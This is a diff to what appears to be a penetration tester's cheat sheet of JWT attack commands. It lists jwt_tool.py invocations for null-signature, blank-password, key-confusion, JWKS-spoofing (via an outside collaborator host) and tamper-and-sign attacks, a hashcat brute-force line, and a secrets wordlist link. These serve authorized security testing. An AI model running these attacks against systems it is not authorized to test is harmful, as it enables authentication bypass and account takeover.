@@ -1,3 +1,6 @@
+
+JWT Checks - https://karol-mazurek95.medium.com/appsec-tales-viii-jwt-7e28b8fc0dd2
+-----------------------------------------------------------------------------------------------
 JWT Token Verify - python3 jwt_tool.py -v eyJh....
 JWT All Tests - python3 jwt_tool.py -M at -t "http://host/TokenRefresh" -rh "Authorization: Bearer eyJhb....."
 JWT BruteForce - hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
@@ -10,3 +13,11 @@ JWT Key Confisuon - python3 jwt_tool.py eyJhbGciOi -X k -pk <pubkey>
 JWT Null Sign Check (OnTaget) - python3 jwt_tool.py -X n -t "http://host/TokenRefresh" -rh "Authorization: Bearer eyJhb...."
 JWT Blank Password (OnTaget) - python3 jwt_tool.py -X b -t "http://host//TokenRefresh" -rh "Authorization: Bearer eyJhb...."
 JWKS Spoofing - python3 jwt_tool.py -X s -ju "http://your_colobrator" -t "http://host/TokenRefresh" -rh "Authorization: Bearer eyJ...."
+JWT Tamper and Sign - python3 jwt_tool.py "eyJh" -T -S hs256 -p 12345
+JWT Tamper and Sign - python3 jwt_tool.py -t "http://host/TokenRefresh" -rh "Authorization: Bearer eyJh...." -T -S hs256 -p 12345
+
+
+
+Dictionaries
+-----------------------------------------------------------------------------------------------
+https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
